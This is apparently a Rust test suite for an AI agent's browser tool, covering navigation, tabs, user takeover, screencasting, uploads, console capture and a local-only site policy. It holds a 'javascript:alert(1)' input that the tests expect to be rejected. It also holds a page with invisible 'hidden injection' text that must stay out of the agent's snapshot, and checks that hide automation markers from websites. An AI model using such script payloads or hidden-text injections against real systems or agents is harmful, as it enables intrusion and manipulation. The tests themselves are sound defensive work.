    assert_eq!(go.last().unwrap().params["url"], "http://localhost:3000");
    assert_eq!(go.last().unwrap().session_id.as_deref(), Some("S1"));

    // Back through history; nothing further forward is a no-op.
    r.fake.ok(
        "Page.getNavigationHistory",
        json!({"currentIndex": 1, "entries": [
            {"id": 7, "url": "https://shop.example/checkout"},
            {"id": 8, "url": "http://localhost:3000/"}]}),
    );
    r.browser
        .navigate(&nav(None, Some(NavAction::Back)))
        .await
        .unwrap();
    r.browser
        .navigate(&nav(None, Some(NavAction::Forward)))
        .await
        .unwrap();
    let hist = r.fake.calls_to("Page.navigateToHistoryEntry");
    assert_eq!(hist.len(), 1);
    assert_eq!(hist[0].params["entryId"], 7);
    r.browser
        .navigate(&nav(None, Some(NavAction::Reload)))
        .await
        .unwrap();
    assert_eq!(r.fake.calls_to("Page.reload").len(), 1);

    // Not a web address, or neither/both of url and action.
    assert!(
        r.browser
            .navigate(&nav(Some("javascript:alert(1)"), None))
            .await
            .is_err()
    );
    assert!(r.browser.navigate(&nav(None, None)).await.is_err());

    // The agent's next action knows the user acted.
    r.allow_site("shop.example");
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.contains("note: the user acted in the browser"), "{out}");

    // A new tab becomes the shown one; closing it falls back to the first.
    r.fake.reset("Target.createTarget");
    r.fake.ok("Target.createTarget", json!({"targetId": "T2"}));
    r.fake.reset("Target.attachToTarget");
    r.fake
        .ok("Target.attachToTarget", json!({"sessionId": "S2"}));
    let t2 = r
        .browser
        .tab_new(&TabNewParams {
            session_id: SESSION.into(),
            url: None,
        })
        .await
        .unwrap();
    assert_eq!(t2.tab_id, "t2");
    assert_eq!(
        r.fake
            .calls_to("Target.createTarget")
            .last()
            .unwrap()
            .params["url"],
        "about:blank"
    );
    let tabs = r.browser.tabs(SESSION).await.tabs;
    assert!(tabs.iter().any(|t| t.tab_id == "t2" && t.active));
    r.browser
        .tab_close(&BrowserTabParams {
            session_id: SESSION.into(),
            tab_id: "t2".into(),
        })
        .await
        .unwrap();
    assert_eq!(
        r.fake.calls_to("Target.closeTarget").last().unwrap().params["targetId"],
        "T2"
    );
    let tabs = r.browser.tabs(SESSION).await.tabs;
    assert_eq!(tabs.len(), 1);
    assert!(tabs[0].active && tabs[0].tab_id == "t1");

    // A pop-up from the user's click joins the strip and is shown.
    r.fake.reset("Target.attachToTarget");
    r.fake
        .ok("Target.attachToTarget", json!({"sessionId": "S3"}));
    r.fake.emit(
        json!({"method": "Target.targetCreated", "params": {"targetInfo": {
        "targetId": "T3", "type": "page", "openerId": "T1", "url": "https://shop.example/help"}}}),
    );
    let b = r.browser.clone();
    eventually(move || {
        b.session(SESSION)
            .active_tab()
            .is_some_and(|t| t.target_id == "T3")
    })
    .await;

    // During a turn, input pauses the agent (D56).
    r.host.idle.store(false, Ordering::SeqCst);
    let tab = r.browser.session(SESSION).active_tab().unwrap().tab_id;
    r.browser
        .input(&BrowserInputParams {
            session_id: SESSION.into(),
            tab_id: tab,
            event: InputEvent::Mouse {
                action: "pressed".into(),
                x: 10.0,
                y: 10.0,
                button: Some("left".into()),
                click_count: 1,
                modifiers: 0,
            },
        })
        .await
        .unwrap();
    assert_eq!(
        r.host.controls.lock().unwrap().last(),
        Some(&genie_browser::Control::User)
    );
}

/// Drives a real local Chrome/Edge/Chromium (`cargo test -p genie-browser -- --ignored`).
#[tokio::test]
#[ignore = "needs a local Chrome, Edge or Chromium"]
async fn real_chrome_smoke() {
    use genie_browser::{SystemChromeBackend, SystemChromeConfig};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    if genie_browser::discover::find_installed().await.is_empty() {
        eprintln!("no browser installed; skipping");
        return;
    }
    let tasks = TaskTracker::new();
    // A tiny local page.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tasks.spawn(async move {
        while let Ok((mut s, _)) = listener.accept().await {
            let mut buf = [0u8; 2048];
            let _ = s.read(&mut buf).await;
            let body = "<html><head><title>Genie test</title></head><body><h1>Hello</h1>\
                <form><input aria-label='Name' id='n'><button type='button' onclick=\"document.querySelector('h1').textContent='Hi '+document.getElementById('n').value\">Greet</button></form>\
                <p style='opacity:0'>hidden injection</p></body></html>";
            let resp = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = s.write_all(resp.as_bytes()).await;
        }
    });
    let dir = tempfile::tempdir().unwrap();
    let backend = Arc::new(SystemChromeBackend::new(
        SystemChromeConfig::new(dir.path()),
        tasks.clone(),
    ));
    let host = Arc::new(RecordingHost::default());
    let browser = Browser::new(
        backend.clone(),
        host,
        Arc::new(SitePolicy::new()),
        BrowserConfig::default(),
        tasks.clone(),
    );
    let ts = tools(&browser);
    let gate = Arc::new(Gate::default());
    let events = Arc::new(Events::default());
    let ctx = |tool: &str| ToolCtx {
        env: Arc::new(ToolEnv::new(SESSION, SessionKind::Chat)),
        turn_id: "t".into(),
        call_id: "c".into(),
        tool_name: tool.into(),
        cancel: CancellationToken::new(),
        detach: CancellationToken::new(),
        permissions: gate.clone(),
        events: events.clone(),
    };
    let call = |name: &'static str, input: Value| {
        let t = ts.iter().find(|t| t.name() == name).unwrap().clone();
        let c = ctx(name);
        async move { t.execute(input, c).await.unwrap().to_text() }
    };
    let out = call(
        "browser_navigate",
        json!({"url": format!("http://127.0.0.1:{port}/")}),
    )
    .await;
    println!("{out}");
    assert!(out.contains("status: ok"), "{out}");
    assert!(out.contains("heading \"Hello\""), "{out}");
    assert!(!out.contains("hidden injection"));
    let snap = call("browser_snapshot", json!({})).await;
    let r_name = snap
        .lines()
        .find(|l| l.contains("textbox \"Name\""))
        .and_then(|l| l.split("[ref=").nth(1))
        .and_then(|s| s.split(']').next())
        .unwrap()
        .to_string();
    let r_btn = snap
        .lines()
        .find(|l| l.contains("button \"Greet\""))
        .and_then(|l| l.split("[ref=").nth(1))
        .and_then(|s| s.split(']').next())
        .unwrap()
        .to_string();
    call("browser_type", json!({"ref": r_name, "text": "Genie"})).await;
    let out = call("browser_click", json!({"ref": r_btn})).await;
    println!("{out}");
    assert!(out.contains("Hi Genie"), "{out}");
    genie_browser::BrowserBackend::shutdown(backend.as_ref()).await;
}

/// The Browser panel against a real local Chrome/Edge/Chromium: a stream opened before the
/// agent browses, take-over click + typing + Enter with the DOM event names the desktop
/// sends, and Pop out (opens a real window for a moment). `-- --ignored`.
#[tokio::test]
#[ignore = "needs a local Chrome, Edge or Chromium; opens a window"]
async fn real_chrome_panel_flow() {
    use genie_browser::{SystemChromeBackend, SystemChromeConfig};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    if genie_browser::discover::find_installed().await.is_empty() {
        eprintln!("no browser installed; skipping");
        return;
    }
    let tasks = TaskTracker::new();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tasks.spawn(async move {
        while let Ok((mut s, _)) = listener.accept().await {
            let mut buf = [0u8; 2048];
            let _ = s.read(&mut buf).await;
            let body = "<html><head><title>Panel test</title></head><body style='margin:0'><h1>Hello</h1>\
                <form onsubmit=\"event.preventDefault();document.querySelector('h1').textContent='Sent '+document.getElementById('n').value\">\
                <input aria-label='Name' id='n' style='position:absolute;left:100px;top:100px;width:200px;height:30px'></form>\
                <input type='file' id='f' style='position:absolute;left:100px;top:200px;width:200px;height:30px'></body></html>";
            let resp = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = s.write_all(resp.as_bytes()).await;
        }
    });
    let dir = tempfile::tempdir().unwrap();
    let backend = Arc::new(SystemChromeBackend::new(
        SystemChromeConfig::new(dir.path()),
        tasks.clone(),
    ));
    let host = Arc::new(RecordingHost::default());
    let browser = Browser::new(
        backend.clone(),
        host.clone(),
        Arc::new(SitePolicy::new()),
        BrowserConfig::default(),
        tasks.clone(),
    );
    let ts = tools(&browser);
    let gate = Arc::new(Gate::default());
    let events = Arc::new(Events::default());
    let call = |name: &'static str, input: Value| {
        let t = ts.iter().find(|t| t.name() == name).unwrap().clone();
        let c = ToolCtx {
            env: Arc::new(ToolEnv::new(SESSION, SessionKind::Chat)),
            turn_id: "t".into(),
            call_id: "c".into(),
            tool_name: name.into(),
            cancel: CancellationToken::new(),
            detach: CancellationToken::new(),
            permissions: gate.clone(),
            events: events.clone(),
        };
        async move { t.execute(input, c).await.unwrap().to_text() }
    };
    // Waits for a frame newer than `after`, acking as a client would.
    let next_frame = |log: Arc<FrameLog>, after: usize| {
        let b = browser.clone();
        async move {
            for _ in 0..300 {
                let last = log.0.lock().unwrap().last().cloned();
                if let Some(f) = &last {
                    let _ = b.screencast_ack(&ScreencastAckParams {
                        stream_id: f.stream_id.clone(),
                        frame_seq: f.frame_seq,
                    });
                }
                if log.0.lock().unwrap().len() > after {
                    return log.0.lock().unwrap().last().cloned().unwrap();
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
            panic!("no frame");
        }
    };

    // 1. The panel opens first.
    let log = Arc::new(FrameLog::default());
    let sc = browser
        .screencast_start(&cast_params(None), log.clone())
        .await
        .unwrap();
    assert!(
        !genie_browser::BrowserBackend::status(backend.as_ref())
            .await
            .running
    );

    // 2. The agent browses: frames arrive on the same stream.
    let out = call(
        "browser_navigate",
        json!({"url": format!("http://127.0.0.1:{port}/")}),
    )
    .await;
    assert!(out.contains("status: ok"), "{out}");
    let f = next_frame(log.clone(), 0).await;
    println!("frame {}x{} css, scale {}", f.w, f.h, f.device_scale);
    assert_eq!(f.stream_id, sc.stream_id);
    assert!(f.w > 0 && f.h > 0 && f.device_scale > 0.0);

    // Sites see a normal browser: no `HeadlessChrome`, no `navigator.webdriver`.
    let tab = browser.session(SESSION).tab("t1").unwrap();
    let c = browser.client().await.unwrap();
    let v = c
        .call_in(
            Some(&tab.cdp_session),
            "Runtime.evaluate",
            json!({"expression": "[navigator.userAgent, navigator.webdriver, JSON.stringify(navigator.userAgentData?.brands)]", "returnByValue": true}),
        )
        .await
        .unwrap();
    println!("ua {}", v["result"]["value"]);
    let ua = v["result"]["value"].to_string();
    assert!(!ua.contains("Headless"), "{ua}");
    assert_eq!(v["result"]["value"][1], false, "{ua}");

    // The panel's size: frames report it in CSS px, so clicks below map 1:1.
    let n = log.0.lock().unwrap().len();
    browser
        .set_viewport(&genie_protocol::api::browser::ViewportParams {
            session_id: SESSION.into(),
            width: 900,
            height: 640,
            device_scale: 1.0,
        })
        .await
        .unwrap();
    let mut f = next_frame(log.clone(), n).await;
    for _ in 0..20 {
        if f.w == 900 {
            break;
        }
        let n = log.0.lock().unwrap().len();
        f = next_frame(log.clone(), n).await;
    }
    println!("frame {}x{} css, scale {}", f.w, f.h, f.device_scale);
    assert_eq!((f.w, f.h), (900, 640));

    // 3. Take over: click the field, type, press Enter (DOM names, as the desktop sends).
    browser.takeover(SESSION);
    let input = |event: InputEvent| {
        let b = browser.clone();
        async move {
            b.input(&BrowserInputParams {
                session_id: SESSION.into(),
                tab_id: "t1".into(),
                event,
            })
            .await
            .unwrap();
        }
    };
    for action in ["down", "up"] {
        input(InputEvent::Mouse {
            action: action.into(),
            x: 150.0,
            y: 115.0,
            button: Some("left".into()),
            click_count: 1,
            modifiers: 0,
        })
        .await;
    }
    for (key, code, text) in [
        ("G", "KeyG", Some("G")),
        ("o", "KeyO", Some("o")),
        ("Enter", "Enter", None),
    ] {
        for action in ["down", "up"] {
            input(InputEvent::Key {
                action: action.into(),
                key: key.into(),
                code: code.into(),
                modifiers: 0,
                text: if action == "down" {
                    text.map(String::from)
                } else {
                    None
                },
            })
            .await;
        }
    }
    tokio::time::sleep(Duration::from_millis(300)).await;

    // Select all (Cmd on macOS gets an explicit editing command) and copy.
    let select_all = if cfg!(target_os = "macos") { 4 } else { 2 };
    for action in ["down", "up"] {
        input(InputEvent::Key {
            action: action.into(),
            key: "a".into(),
            code: "KeyA".into(),
            modifiers: select_all,
            text: None,
        })
        .await;
    }
    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(browser.copy_selection(SESSION, "t1").await.unwrap(), "Go");

    // A real file input: intercepted, sent to the client, filled with the user's file.
    for action in ["down", "up"] {
        input(InputEvent::Mouse {
            action: action.into(),
            x: 150.0,
            y: 215.0,
            button: Some("left".into()),
            click_count: 1,
            modifiers: 0,
        })
        .await;
    }
    eventually(|| !host.choosers.lock().unwrap().is_empty()).await;
    let ch = host.choosers.lock().unwrap()[0].clone();
    let upload = dir.path().join("hello.txt");
    std::fs::write(&upload, b"hi").unwrap();
    browser
        .file_chooser_answer(&genie_protocol::api::browser::FileChooserAnswerParams {
            session_id: SESSION.into(),
            chooser_id: ch.chooser_id,
            files: vec![upload.to_string_lossy().into_owned()],
        })
        .await
        .unwrap();
    let tab = browser.session(SESSION).tab("t1").unwrap();
    let c = browser.client().await.unwrap();
    let v = c
        .call_in(
            Some(&tab.cdp_session),
            "Runtime.evaluate",
            json!({"expression": "document.getElementById('f').files[0]?.name", "returnByValue": true}),
        )
        .await
        .unwrap();
    assert_eq!(v["result"]["value"], "hello.txt");

    browser.handback(SESSION);
    let snap = call("browser_snapshot", json!({})).await;
    println!("{snap}");
    assert!(snap.contains("Sent Go"), "{snap}");

    // 4. Pop out: a real window, same tab id and page, the stream keeps going.
    let n = log.0.lock().unwrap().len();
    browser.popout(SESSION).await.unwrap();
    assert!(genie_browser::BrowserBackend::headed(backend.as_ref()));
    let tabs = browser.tabs(SESSION).await.tabs;
    assert_eq!(tabs.len(), 1, "{tabs:?}");
    assert_eq!(tabs[0].tab_id, "t1");
    assert!(tabs[0].url.contains(&port.to_string()), "{tabs:?}");
    let f = next_frame(log.clone(), n).await;
    assert_eq!(f.stream_id, sc.stream_id);
    let out = call("browser_snapshot", json!({})).await;
    assert!(out.contains("note: the user acted"), "{out}");
    assert!(out.contains("heading \"Hello\""), "{out}");

    // 5. The user closes the popped-out window: the tab comes back into the panel at its
    // page and the stream goes on; then pop out works again.
    let c = browser.client().await.unwrap();
    let _ = c.call("Browser.close", json!({})).await;
    for _ in 0..200 {
        if c.is_closed() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
    assert!(c.is_closed());
    let n = log.0.lock().unwrap().len();
    let tabs = browser.tabs(SESSION).await.tabs;
    assert_eq!(tabs.len(), 1, "{tabs:?}");
    assert_eq!(tabs[0].tab_id, "t1");
    assert!(tabs[0].url.contains(&port.to_string()), "{tabs:?}");
    assert!(!genie_browser::BrowserBackend::headed(backend.as_ref()));
    let f = next_frame(log.clone(), n).await;
    assert_eq!(f.stream_id, sc.stream_id);
    browser.popout(SESSION).await.unwrap();
    assert!(genie_browser::BrowserBackend::headed(backend.as_ref()));
    let tabs = browser.tabs(SESSION).await.tabs;
    assert_eq!(tabs.len(), 1, "{tabs:?}");
    assert!(tabs[0].url.contains(&port.to_string()), "{tabs:?}");

    browser
        .screencast_stop(&StreamIdParams {
            stream_id: sc.stream_id,
        })
        .await;
    genie_browser::BrowserBackend::shutdown(backend.as_ref()).await;
}

/// The user's own browsing against a real local Chrome/Edge/Chromium (t47): an address
/// typed in the panel opens and streams with no agent involved, history works, and a
/// `target=_blank` click while Genie is idle opens a tab that the panel shows.
#[tokio::test]
#[ignore = "needs a local Chrome, Edge or Chromium"]
async fn real_chrome_user_browsing() {
    use genie_browser::{SystemChromeBackend, SystemChromeConfig};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    if genie_browser::discover::find_installed().await.is_empty() {
        eprintln!("no browser installed; skipping");
        return;
    }
    let tasks = TaskTracker::new();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tasks.spawn(async move {
        while let Ok((mut s, _)) = listener.accept().await {
            let mut buf = [0u8; 2048];
            let n = s.read(&mut buf).await.unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            let body = if req.starts_with("GET /two") {
                "<html><head><title>Two</title></head><body><h1>Two</h1></body></html>"
            } else {
                "<html><head><title>One</title></head><body style='margin:0'>\
                 <a href='/two' target='_blank' style='position:absolute;left:0;top:0;width:300px;height:100px;display:block'>open</a>\
                 </body></html>"
            };
            let resp = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = s.write_all(resp.as_bytes()).await;
        }
    });
    let dir = tempfile::tempdir().unwrap();
    let backend = Arc::new(SystemChromeBackend::new(
        SystemChromeConfig::new(dir.path()),
        tasks.clone(),
    ));
    let host = Arc::new(RecordingHost::default());
    host.idle.store(true, Ordering::SeqCst);
    let browser = Browser::new(
        backend.clone(),
        host.clone(),
        Arc::new(SitePolicy::new()),
        BrowserConfig::default(),
        tasks.clone(),
    );
    let titles = |b: Arc<Browser>| async move {
        b.tabs(SESSION)
            .await
            .tabs
            .into_iter()
            .map(|t| (t.title, t.active))
            .collect::<Vec<_>>()
    };

    // The panel is open before anything else; the user types an address.
    let log = Arc::new(FrameLog::default());
    browser
        .screencast_start(&cast_params(None), log.clone())
        .await
        .unwrap();
    let t = browser
        .navigate(&nav(Some(&format!("127.0.0.1:{port}")), None))
        .await
        .unwrap();
    assert_eq!(t.tab_id, "t1");
    let mut ok = false;
    for _ in 0..250 {
        let has_frame = log.0.lock().unwrap().iter().any(|f| f.tab_id == "t1");
        let t = titles(browser.clone()).await;
        if has_frame && t == vec![("One".to_string(), true)] {
            ok = true;
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert!(ok, "no frame or title: {:?}", titles(browser.clone()).await);
    assert!(
        host.controls.lock().unwrap().is_empty(),
        "idle: no 'user in control'"
    );
    assert!(host.confirms.lock().unwrap().is_empty());

    // A click on a target=_blank link: the pop-up joins the strip and is shown.
    let f = log.0.lock().unwrap().last().cloned().unwrap();
    for action in ["pressed", "released"] {
        browser
            .input(&BrowserInputParams {
                session_id: SESSION.into(),
                tab_id: f.tab_id.clone(),
                event: InputEvent::Mouse {
                    action: action.into(),
                    x: 50.0,
                    y: 50.0,
                    button: Some("left".into()),
                    click_count: 1,
                    modifiers: 0,
                },
            })
            .await
            .unwrap();
    }
    let mut ok = false;
    for _ in 0..250 {
        let t = titles(browser.clone()).await;
        if t.len() == 2 && t[1] == ("Two".to_string(), true) {
            ok = true;
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert!(ok, "pop-up not shown: {:?}", titles(browser.clone()).await);
    assert!(host.controls.lock().unwrap().is_empty());

    // Closing it shows the first tab again; reload and a no-op back still work.
    browser
        .tab_close(&BrowserTabParams {
            session_id: SESSION.into(),
            tab_id: "t2".into(),
        })
        .await
        .unwrap();
    assert_eq!(
        titles(browser.clone()).await,
        vec![("One".to_string(), true)]
    );
    browser
        .navigate(&nav(None, Some(NavAction::Reload)))
        .await
        .unwrap();
    browser
        .navigate(&nav(None, Some(NavAction::Back)))
        .await
        .unwrap();
    browser.end_session(SESSION).await;
    genie_browser::BrowserBackend::shutdown(backend.as_ref()).await;
}

/// Ticket 47 phase 3: `browser_console` against a real browser — console calls, an uncaught
/// exception and a failed resource load; the log starts over on reload.
#[tokio::test]
#[ignore = "needs a local Chrome, Edge or Chromium"]
async fn real_chrome_console() {
    use genie_browser::{SystemChromeBackend, SystemChromeConfig};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    if genie_browser::discover::find_installed().await.is_empty() {
        eprintln!("no browser installed; skipping");
        return;
    }
    let tasks = TaskTracker::new();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tasks.spawn(async move {
        while let Ok((mut s, _)) = listener.accept().await {
            let mut buf = [0u8; 2048];
            let n = s.read(&mut buf).await.unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]);
            let (status, body) = if req.starts_with("GET / ") {
                (
                    "200 OK",
                    "<html><head><title>Console</title></head><body><h1>App</h1>\
                     <img src='/missing.png'>\
                     <script>console.log('hello', 42); console.warn('careful');\
                     console.error('boom');\
                     setTimeout(() => { throw new TypeError('kaboom'); }, 0);</script></body></html>",
                )
            } else {
                ("404 Not Found", "nope")
            };
            let resp = format!(
                "HTTP/1.1 {status}\r\ncontent-type: text/html\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = s.write_all(resp.as_bytes()).await;
        }
    });
    let dir = tempfile::tempdir().unwrap();
    let backend = Arc::new(SystemChromeBackend::new(
        SystemChromeConfig::new(dir.path()),
        tasks.clone(),
    ));
    let browser = Browser::new(
        backend.clone(),
        Arc::new(RecordingHost::default()),
        Arc::new(SitePolicy::new()),
        BrowserConfig::default(),
        tasks.clone(),
    );
    let ts = tools(&browser);
    let gate = Arc::new(Gate::default());
    let events = Arc::new(Events::default());
    let ctx = |tool: &str| ToolCtx {
        env: Arc::new(ToolEnv::new(SESSION, SessionKind::Code)),
        turn_id: "t".into(),
        call_id: "c".into(),
        tool_name: tool.into(),
        cancel: CancellationToken::new(),
        detach: CancellationToken::new(),
        permissions: gate.clone(),
        events: events.clone(),
    };
    let call = |name: &'static str, input: Value| {
        let t = ts.iter().find(|t| t.name() == name).unwrap().clone();
        let c = ctx(name);
        async move { t.execute(input, c).await.unwrap().to_text() }
    };
    // `localhost` needs no site approval (the gate would record an ask), and the
    // local-only policy keeps it reachable.
    browser.sites.set_local_only(true, true);
    let out = call(
        "browser_navigate",
        json!({"url": format!("http://localhost:{port}/")}),
    )
    .await;
    assert!(out.contains("status: ok"), "{out}");
    assert!(
        gate.asked.lock().unwrap().is_empty(),
        "localhost asked for approval"
    );
    tokio::time::sleep(Duration::from_millis(500)).await;

    let out = call("browser_console", json!({})).await;
    println!("{out}");
    assert!(out.contains("[error] boom"), "{out}");
    assert!(out.contains("[warning] careful"), "{out}");
    assert!(out.contains("Uncaught TypeError: kaboom"), "{out}");
    assert!(out.contains("missing.png"), "{out}");
    assert!(!out.contains("favicon.ico"), "{out}");
    assert!(
        !out.contains("hello 42"),
        "log level hidden by default: {out}"
    );
    let all = call("browser_console", json!({"level": "all"})).await;
    assert!(all.contains("[log] hello 42"), "{all}");

    // A reload starts the log over (the page logs the same things again, once).
    call("browser_navigate", json!({"action": "reload"})).await;
    tokio::time::sleep(Duration::from_millis(500)).await;
    let out = call("browser_console", json!({"level": "error"})).await;
    assert_eq!(out.matches("[error] boom").count(), 1, "{out}");
    browser.end_session(SESSION).await;
    genie_browser::BrowserBackend::shutdown(backend.as_ref()).await;
}

/// Ticket 47 phase 4 against a real browser: Element select (`inspect`) finds the element
/// under a point with a selector and a crop; a local HTML file opens in a tab; the
/// local-only policy keeps the agent and the user off outside sites.
#[tokio::test]
#[ignore = "needs a local Chrome, Edge or Chromium"]
async fn real_chrome_inspect_files_and_local_only() {
    use genie_browser::{SystemChromeBackend, SystemChromeConfig};
    use genie_protocol::api::browser::InspectParams;

    if genie_browser::discover::find_installed().await.is_empty() {
        eprintln!("no browser installed; skipping");
        return;
    }
    let tasks = TaskTracker::new();
    let dir = tempfile::tempdir().unwrap();
    let page = dir.path().join("demo.html");
    std::fs::write(
        &page,
        "<html><head><title>Demo</title><style>body{margin:0}</style></head><body>\
         <div class='toolbar'><button id='save' style='position:absolute;left:10px;top:10px;width:120px;height:40px'>Save draft</button></div>\
         <ul style='position:absolute;top:100px'><li>a</li><li class='item'>second item</li></ul></body></html>",
    )
    .unwrap();
    let backend = Arc::new(SystemChromeBackend::new(
        SystemChromeConfig::new(&dir.path().join("profile")),
        tasks.clone(),
    ));
    let browser = Browser::new(
        backend.clone(),
        Arc::new(RecordingHost::default()),
        Arc::new(SitePolicy::new()),
        BrowserConfig::default(),
        tasks.clone(),
    );

    // A local file in a new tab.
    let tab = browser.open_file(SESSION, &page).await.unwrap().tab_id;
    tokio::time::sleep(Duration::from_millis(600)).await;
    let tabs = browser.tabs(SESSION).await.tabs;
    assert!(
        tabs.iter()
            .any(|t| t.title == "Demo" && t.url.starts_with("file://")),
        "{tabs:?}"
    );

    // Element select: the button by id, with a crop; the list item by structure.
    let r = browser
        .inspect(&InspectParams {
            session_id: SESSION.into(),
            tab_id: tab.clone(),
            x: 50.0,
            y: 25.0,
            capture: true,
        })
        .await
        .unwrap();
    assert_eq!(r.selector, "#save");
    assert_eq!(r.tag, "button");
    assert_eq!(r.text, "Save draft");
    assert!(
        (r.w - 120.0).abs() < 1.0 && (r.h - 40.0).abs() < 1.0,
        "{r:?}"
    );
    let jpeg = {
        use base64::Engine as _;
        base64::engine::general_purpose::STANDARD
            .decode(r.image_b64.as_deref().unwrap())
            .unwrap()
    };
    assert_eq!(&jpeg[..2], &[0xFF, 0xD8], "a JPEG crop");
    let li = browser
        .inspect(&InspectParams {
            session_id: SESSION.into(),
            tab_id: tab.clone(),
            x: 60.0,
            y: 100.0 + 16.0 + 18.0 + 8.0,
            capture: false,
        })
        .await
        .unwrap();
    assert_eq!(li.text, "second item", "{li:?}");
    assert!(li.selector.contains("li.item"), "{li:?}");
    assert!(li.image_b64.is_none());

    // Local-only policy: the user can still open localhost, not outside sites.
    browser.sites.set_local_only(true, true);
    let err = browser
        .navigate(&nav(Some("https://example.org/"), None))
        .await
        .unwrap_err();
    assert!(err.to_string().contains("local dev servers"), "{err}");
    browser.end_session(SESSION).await;
    genie_browser::BrowserBackend::shutdown(backend.as_ref()).await;
}
